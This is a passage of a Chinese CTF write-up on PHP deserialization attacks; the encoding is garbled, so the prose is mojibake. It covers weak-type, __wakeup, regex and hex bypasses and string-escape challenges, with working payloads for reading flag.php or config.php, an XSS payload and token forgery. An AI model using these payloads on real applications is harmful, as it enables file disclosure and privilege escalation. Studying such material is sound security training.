opå€¼å¯¹æ¯”ï¼š2çš„è¯å¼ºåˆ¶è½¬æ¢æˆ1ï¼›4.è°ƒç”¨process()å‡½æ•°5.op == &quot;1&quot;ä¸ºå†™å†…å®¹ï¼›op == &quot;2&quot;ä¸ºè¯»å–å†…å®¹6.æˆ‘ä»¬éœ€è¦è¯»å–åˆ° flag.phpæ–‡ä»¶å½“ä¸­çš„å†…å®¹ï¼Œåº”è¯¥è¶Šè¿‡ 3. ä¸­å¯¹opçš„æ£€æµ‹ å¯ä»¥ä½¿ç”¨ å¼±ç±»å‹ç»•è¿‡ op=ç©ºæ ¼2 æˆ–è€…æ˜¯ op=æ•°å­—2 æ¥è¶Šè¿‡===7.è¿™æ ·å³ä½¿ä½¿ç”¨çš„ä¸æ˜¯å­—ç¬¦ä¸²2ï¼Œä¹Ÿå¯ä»¥æ»¡è¶³==çš„æ¡ä»¶ï¼Œä»è€Œè¯»å–åˆ°å†…å®¹ 123456789101112131415&lt;?phpclass FileHandler &#123; public $op=&#x27; 2&#x27;; //ç©ºæ ¼ 2 public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = serialize($flag);echo $flag_1;?&gt;//O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:2:&quot; 2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125; //O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; //O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:7:&quot;content&quot;;N;&#125; æ˜“é”™ï¼š â€‹ protectedæƒé™çš„å˜é‡åœ¨åºåˆ—åŒ–çš„æ—¶ä¼šæœ‰%00%00å­—ç¬¦*ï¼Œ%00å­—ç¬¦çš„ASCIIç ä¸º0ï¼Œå°±æ— æ³•é€šè¿‡ä¸Šé¢çš„ is_validå‡½æ•°æ ¡éªŒã€‚ è§£å†³åŠæ³•1ï¼š php7.1+ç‰ˆæœ¬å¯¹å±æ€§ç±»å‹ä¸æ•æ„Ÿï¼Œæœ¬åœ°åºåˆ—åŒ–çš„æ—¶å€™å°†å±æ€§æ”¹ä¸ºpublicè¿›è¡Œç»•è¿‡å³å¯ 12345678910&lt;?phpclass FileHandler &#123; public $op=&#x27; 2&#x27;; public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = urlencode(serialize($flag));echo $flag_1;?&gt; è§£å†³åŠæ³•2ï¼š %00æ›´æ”¹ä¸º \\00ï¼Œs æ›´æ”¹ä¸º S 1234567891011121314&lt;?phpclass FileHandler &#123; protected $op=&#x27; 2&#x27;; protected $filename=&#x27;flag.php&#x27;; protected $content;&#125;$flag = new FileHandler();$flag_1 = urlencode(serialize($flag));echo $flag_1;?&gt;//å°†æ‰€å¾—åˆ°çš„å†…å®¹ä¸­ %00æ›´æ”¹ä¸º \\00ï¼Œs æ›´æ”¹ä¸º S//O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\\00%2A\\00op%22%3BS%3A2%3A%22+2%22%3BS%3A11%3A%22\\00%2A\\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\\00%2A\\00content%22%3BN%3B%7D //O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D pikachu 1234567891011121314151617&lt;?phpclass S&#123; var $test = &quot;pikachu&quot;; function __construct()&#123; echo $this-&gt;test; &#125;&#125;$html=&#x27;&#x27;;if(isset($_POST[&#x27;o&#x27;]))&#123; $s = $_POST[&#x27;o&#x27;]; if(!@$unser = unserialize($s))&#123; $html.=&quot;&lt;p&gt;å¤§å…„å¼Ÿ,æ¥ç‚¹åŠ²çˆ†ç‚¹å„¿çš„!&lt;/p&gt;&quot;; &#125;else&#123; $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;; &#125;&#125;?&gt; 123456789//è·å–payload&lt;?phpclass S&#123; var $test = &quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125;$unser = new S();echo serialize($unser);?&gt;//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(/xss/)&lt;/script&gt;&quot;;&#125; 1.5.2 â€œç™¾åº¦æ¯â€CTFæ¯”èµ› åæœˆåœºé¢˜ç›®é“¾æ¥ index.php?key=123&amp;hash=f9109d5f83921a551cf859f853afe7bb æŸ¥çœ‹æºä»£ç  è¿›è¡Œ md5 è§£å¯†ï¼Œå¾—åˆ° kkkkkk01123 åˆ™ $key= æ ¹æ®é¢˜ç›®ï¼Œä¸èƒ½ä½¿ ?key=123 åˆ™æˆ‘ä»¬ä¼ å…¥ ?key=111&amp;hash=adaa10eef3a02754da03b5a3a6f40ae6 å¾—åˆ° next step is Gu3ss_m3_h2h2.php ç„¶åæˆ‘ä»¬è®¿é—® Gu3ss_m3_h2h2.php 1234567891011121314151617181920212223242526272829303132&lt;?phpclass Demo &#123; private $file = &#x27;Gu3ss_m3_h2h2.php&#x27;; public function __construct($file) &#123; $this-&gt;file = $file; &#125; function __destruct() &#123; echo @highlight_file($this-&gt;file, true); &#125; function __wakeup() &#123; if ($this-&gt;file != &#x27;Gu3ss_m3_h2h2.php&#x27;) &#123; //the secret is in the f15g_1s_here.php $this-&gt;file = &#x27;Gu3ss_m3_h2h2.php&#x27;; &#125; &#125;&#125;if (isset($_GET[&#x27;var&#x27;])) &#123; $var = base64_decode($_GET[&#x27;var&#x27;]); if (preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $var)) &#123; die(&#x27;stop hacking!&#x27;); &#125; else &#123; @unserialize($var); &#125;&#125; else &#123; highlight_file(&quot;Gu3ss_m3_h2h2.php&quot;);&#125;?&gt; 1.6 ååºåˆ—åŒ–ç»•è¿‡æŠ€å·§1.6.1 php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿæµ‹è¯•ç¯å¢ƒï¼šphp7.2.9 1234567891011&lt;?phpclass test&#123; protected $a; public function __construct()&#123; $this-&gt;a = &#x27;abc&#x27;; &#125; public function __destruct()&#123; echo $this-&gt;a; &#125;&#125;unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;); å¯ä»¥çœ‹åˆ°ï¼Œå³æ˜¯ a æ²¡æœ‰%00*%00 ä¹Ÿè¾“å‡ºäº† abc 1.6.2 __wakeup() ç»•è¿‡åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²æ—¶ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­å±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°æ—¶ï¼Œä¼šè·³è¿‡ __wakeup()å‡½æ•°çš„æ‰§è¡Œ ã€‚ ç¯å¢ƒï¼š PHP5 &lt; 5.6.2 PHP7 &lt; 7.0.10 æµ‹è¯•ï¼šphp5.2.17 12345678910111213141516171819202122&lt;?php class test&#123; public $a; public function __construct()&#123; $this-&gt;a = &#x27;aaa&#x27;; &#125; public function __wakeup()&#123; $this-&gt;a = &#x27;bbb&#x27;; &#125; public function __destruct()&#123; echo $this-&gt;a; &#125;&#125;//$b = new test();//echo serialize($b);//O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;aaa//å±æ€§ä¸ªæ•° ä¸º çœŸå®ä¸ªæ•°å€¼ 1unserialize(&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;);echo &quot;&lt;br /&gt;&quot;;//å±æ€§ä¸ªæ•° 3 &gt; çœŸå®ä¸ªæ•°å€¼ 1unserialize(&#x27;O:4:&quot;test&quot;:3:&#123;s:1:&quot;a&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;); 1.6.3 æ­£åˆ™ç»•è¿‡preg_match(&#39;/^O:\\d+/&#39;)åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´ å…¶ä¸­çš„ \\d åŒ¹é…çš„æ˜¯æ•°å­— [0-9]ï¼Œå…¶ç›®çš„å°±æ˜¯æ£€æµ‹æˆ‘ä»¬çš„å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´ ç»•è¿‡1ï¼š+ ç»•è¿‡ (url ä¸­ä¼ å‚ä½¿ç”¨ ç¼–ç  %2b) ç»•è¿‡2ï¼šserialize(array(a)) ç»•è¿‡ //aä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡(åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„) æµ‹è¯•ï¼š 123456789101112131415161718192021222324&lt;?phpclass test&#123; public $a; public function __construct()&#123; $this-&gt;a = &#x27;abc&#x27;; &#125; public function __destruct()&#123; echo $this-&gt;a.PHP_EOL; &#125;&#125;function match($data)&#123; if (preg_match(&#x27;/^O:\\d+/&#x27;,$data))&#123; die(&#x27;you lose!&#x27;); &#125;else&#123; return $data; &#125;&#125;$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;;// +å·ç»•è¿‡$b = str_replace(&#x27;O:4&#x27;,&#x27;O:+4&#x27;, $a);unserialize(match($b));// serialize(array($a));unserialize(&#x27;a:1:&#123;i:0;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#125;&#x27;); 1.6.4 åå…­è¿›åˆ¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤1234O:4:&quot;test&quot;:2:&#123;s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;å¯ä»¥å†™æˆO:4:&quot;test&quot;:2:&#123;S:4:&quot;\\00*\\00\\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;&#125;è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚ ç¤ºä¾‹ï¼š 1234567891011121314151617181920212223242526&lt;?phpclass test&#123; public $username; public function __construct()&#123; $this-&gt;username = &#x27;admin&#x27;; &#125; public function __destruct()&#123; echo 666; &#125;&#125;function check($data)&#123; if(stristr($data, &#x27;username&#x27;)!==False)&#123; echo(&quot;ä½ ç»•ä¸è¿‡ï¼ï¼&quot;.PHP_EOL); &#125; else&#123; return $data; &#125;&#125;// æœªä½œå¤„ç†å‰$a = &#x27;O:4:&quot;test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a);// åšå¤„ç†å \\75æ˜¯uçš„16è¿›åˆ¶$a = &#x27;O:4:&quot;test&quot;:1:&#123;S:8:&quot;\\\\75sername&quot;;s:5:&quot;admin&quot;;&#125;&#x27;;$a = check($a);unserialize($a); 1.6.5 å¼•ç”¨æµ‹è¯• 123456789101112131415&lt;?php class test&#123; public $a; public $b; public function __contruct()&#123; $this-&gt;a = &#x27;aaa&#x27;; $this-&gt;b = &amp;$this-&gt;a; // $b æ˜¯ $a çš„å¼•ç”¨,ä»è€Œä½¿a ä¸ b æ°¸è¿œç›¸ç­‰ &#125; public function __destruct()&#123; if($this-&gt;a === $this-&gt;b)&#123; echo &#x27;success&#x27;; &#125; &#125;&#125;$a = serialize(nre test()); äºŒã€ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸æ¦‚è¿°ï¼šååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼ŒåŒ…æ‹¬å­—ç¬¦å¢åŠ ä¸å­—ç¬¦å‡å°‘ä¸¤ç±»ã€‚ 2.1 çŸ¥è¯†ä¸€ï¼š PHP ååºåˆ—åŒ–æ—¶ï¼Œå¯¹ç±»ä¸­ä¸å­˜åœ¨çš„å±æ€§ä¹Ÿä¼šååºåˆ—åŒ–ï¼› PHP ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ;ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ &#125; ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ï¼›å³å½“å­˜åœ¨ ;&#125; ä¸ &#123; åŒ¹é…æ—¶ï¼Œä¸ä¼šå†å¯¹ ;&#125; åé¢çš„å­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ã€‚ ç®€å•ç†è§£ä¸€ä¸‹ æˆ‘ä»¬åœ¨åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸² ;&#125; åå†åŠ ä¸Šä¸€äº›å†…å®¹ï¼Œå…¶ä»å¯è¢«æ­£å¸¸è§£æï¼Œè¯´æ˜åœ¨ PHP ååºåˆ—æ—¶ç¢°åˆ° ;&#125; ä¸å‰é¢çš„ &#123; é…å¯¹ä¹‹åï¼Œå°±ä¼šåœæ­¢ååºåˆ—åŒ–ã€‚ 2.2 çŸ¥è¯†äºŒï¼š å½“è¿›è¡Œååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­é•¿åº¦ä¸æ‰€æè¿°çš„é•¿åº¦ä¸åŒæ—¶ï¼Œå°±ä¼š æŠ¥é”™ 2.3 å­—ç¬¦å¢å¤š â€” CTF Show 264é¢˜ç›®é“¾æ¥ 123456789101112131415161718192021222324# message.phpï¼š&lt;?phpsession_start();highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;if(isset($_COOKIE[&#x27;msg&#x27;]))&#123; $msg = unserialize(base64_decode($_SESSION[&#x27;msg&#x27;])); if($msg-&gt;token==&#x27;admin&#x27;)&#123; echo $flag; &#125;&#125; 123456789101112131415161718192021222324252627# index.php:Your message has been sent &lt;?phperror_reporting(0);session_start();class message&#123; public $from; public $msg; public $to; public $token=&#x27;user&#x27;; public function __construct($f,$m,$t)&#123; $this-&gt;from = $f; $this-&gt;msg = $m; $this-&gt;to = $t; &#125;&#125;$f = $_GET[&#x27;f&#x27;];$m = $_GET[&#x27;m&#x27;];$t = $_GET[&#x27;t&#x27;];if(isset($f) &amp;&amp; isset($m) &amp;&amp; isset($t))&#123; $msg = new message($f,$m,$t); $umsg = str_replace(&#x27;fuck&#x27;, &#x27;loveU&#x27;, serialize($msg)); $_SESSION[&#x27;msg&#x27;]=base64_encode($umsg); echo &#x27;Your message has been sent&#x27;;&#125;highlight_file(__FILE__); åˆ†æï¼š æƒ³è¦è·å– flagï¼Œéœ€è¦ä½¿ $msg-&gt;token==&#39;admin&#39; ï¼Œè€Œé»˜è®¤ public $token=&#39;user&#39;; å­—ç¬¦ä¸²é€ƒé€¸ï¼šæ„é€  ä»¥ä¸‹å†…å®¹ 1234567891011&lt;?phpclass message&#123; public $from = &#x27;a&#x27;; public $msg = &#x27;b&#x27;; public $to = &#x27;c&#x27;; public $token = &#x27;admin&#x27;;&#125;$msg = new message();echo serialize($msg);# è¾“å‡º O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; æ›´æ”¹ $to çš„å€¼ 1234567891011&lt;?phpclass message&#123; public $from = &#x27;a&#x27;; public $msg = &#x27;b&#x27;; public $to = &#x27;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo serialize($msg);# è¾“å‡º O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:28:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; åˆ©ç”¨ str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg)) è¡¥å……å­—ç¬¦ä¸²é•¿åº¦ï¼›å¢åŠ  27 ä¸ªé•¿åº¦ï¼› 12345678910111213&lt;?phpclass message&#123; public $from = &#x27;a&#x27;; public $msg = &#x27;b&#x27;; public $to = &#x27;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;; public $token=&#x27;admin&#x27;;&#125;$msg = new message();echo serialize($msg);# è¾“å‡º O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;# è¿™æ ·è¢«æ›¿æ¢ä¹‹åå˜æˆä»¥ä¸‹å†…å®¹ï¼Œæ­£å¥½è¡¥ä¸Š O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:136:&quot;cloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; payloadï¼š 1?f=a&amp;m=b&amp;t=cfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125; ç„¶åæˆ‘ä»¬æŠ“åŒ…ï¼Œæ›´æ”¹ cookie å³å¯ 2.4 å­—ç¬¦å¢å¤š â€” [0CTF 2016]piapiapiaé¢˜ç›®é“¾æ¥ åˆ†æï¼š ç›®å½•æ‰«æ ï¼Œå¾—åˆ° www.zipï¼ŒæŸ¥çœ‹æºç  register.php ï¼Œæ³¨å†Œä¸€ä¸‹ æ³¨å†ŒæˆåŠŸä¹‹åï¼Œå°†è·³è½¬ index.phpï¼Œè¿›è¡Œç™»å½• æˆåŠŸç™»å½•ï¼Œè·³è½¬åˆ° update.phpï¼Œå¡«å†™è¯¦ç»†ä¿¡æ¯ï¼Œå¯è¿›è¡Œæ–‡ä»¶ä¸Šä¼  123456789101112131415161718192021222324252627282930313233# update.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt; $user-&gt;update_profile($username, serialize($profile)); å°†å¡«å…¥çš„ä¿¡æ¯è¿›è¡Œ åºåˆ—åŒ– å®ƒçš„ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„æ˜¯ $profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]); ï¼Œèµ·ä¸åˆ° .php æˆ–è€…æ˜¯ å›¾ç‰‡æœ¨é©¬åŒ…å«çš„ä½œç”¨; ä»£ç å®¡è®¡ 12345678910111213141516171819202122# register.php &lt;?php require_once(&#x27;class.php&#x27;); if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die(&#x27;Invalid user name&#x27;); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die(&#x27;Invalid password&#x27;); if(!$user-&gt;is_exists($username)) &#123; $user-&gt;register($username, $password); echo &#x27;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&#x27;; &#125; else &#123; die(&#x27;User name Already Exists&#x27;); &#125; &#125; else &#123;?&gt; æ³¨å†ŒæˆåŠŸï¼Œè¿›å…¥ index.php è¿›è¡Œä¸‹ä¸€æ­¥çš„ç™»å½• 12345678910111213141516171819202122232425262728# index.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;]) &#123; header(&#x27;Location: profile.php&#x27;); exit; &#125; if($_POST[&#x27;username&#x27;] &amp;&amp; $_POST[&#x27;password&#x27;]) &#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; if(strlen($username) &lt; 3 or strlen($username) &gt; 16) die(&#x27;Invalid user name&#x27;); if(strlen($password) &lt; 3 or strlen($password) &gt; 16) die(&#x27;Invalid password&#x27;); if($user-&gt;login($username, $password)) &#123; $_SESSION[&#x27;username&#x27;] = $username; header(&#x27;Location: profile.php&#x27;); exit; &#125; else &#123; die(&#x27;Invalid user name or password&#x27;); &#125; &#125; else &#123;?&gt; ç™»é™†æˆåŠŸä¹‹åï¼Œè¿›å…¥ profile.php 1234567891011121314151617181920212223242526272829303132333435363738# profile.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Profile&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt; &lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt; &lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; $profile = unserialize($profile); å°†å¡«å†™çš„ä¿¡æ¯è¿›è¡Œååºåˆ—åŒ–è¾“å‡º 12345678# config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt; çœ‹åˆ° flag å­˜åœ¨äº config.php æ–‡ä»¶å½“ä¸­ï¼Œæˆ‘ä»¬æƒ³åŠæ³•è¯»å–åˆ° config.php æ€è·¯ï¼šåœ¨ profile.php ä¸­å­˜åœ¨ $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;])); ï¼›è€Œ $profile æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä¿¡æ¯ã€‚å¦‚æœæˆ‘ä»¬æ§åˆ¶ $profile[&#39;photo&#39;] ä¸º config.php é‚£ä¹ˆ ä¹‹åçš„ &lt;?php echo $phone;?&gt; å°†ä¼šæ˜¾ç¤ºå‡º base64 ç¼–ç åçš„ config.php æ–‡ä»¶å†…å®¹ï¼Œæˆ‘ä»¬å°±ä¼šè·å–åˆ° flagã€‚ æµ‹è¯•ï¼š 123456&lt;?php $profile[&#x27;phone&#x27;] = $_GET[&#x27;p&#x27;]; $profile[&#x27;email&#x27;] = $_GET[&#x27;e&#x27;]; $profile[&#x27;nickname&#x27;] = $_GET[&#x27;n&#x27;]; $profile[&#x27;photo&#x27;] = $_GET[&#x27;o&#x27;]; echo serialize($profile); 12GETä¼ å‚ï¼š?p=123&amp;e=123@qq.com&amp;n=aaa&amp;o=config.phpè¾“å‡ºï¼ša:4:a:4:&#123;s:5:&quot;phone&quot;;s:3:&quot;123&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:3:&quot;aaa&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; æ›´æ”¹ nickname çš„å€¼ï¼š 12GETä¼ å‚ï¼š?p=123&amp;e=123@qq.com&amp;n=&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&amp;o=config.phpè¾“å‡ºï¼ša:4:&#123;s:5:&quot;phone&quot;;s:3:&quot;123&quot;;s:5:&quot;email&quot;;s:10:&quot;123@qq.com&quot;;s:8:&quot;nickname&quot;;s:34:&quot;&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; å­—ç¬¦å¢åŠ æ›¿æ¢ ï¼Œè€ƒè™‘åˆ° update.php ä»¥åŠ class.php ä¸­çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬ä¼ å…¥ æ•°ç»„ nickname[] 1nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; payloadï¼š è§£ç å¾— flag 2.5 å­—ç¬¦å‡å°‘ â€” [å®‰æ´µæ¯ 2019]easy_serialize_phpé¢˜ç›®é“¾æ¥ 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?php$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION); &#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a 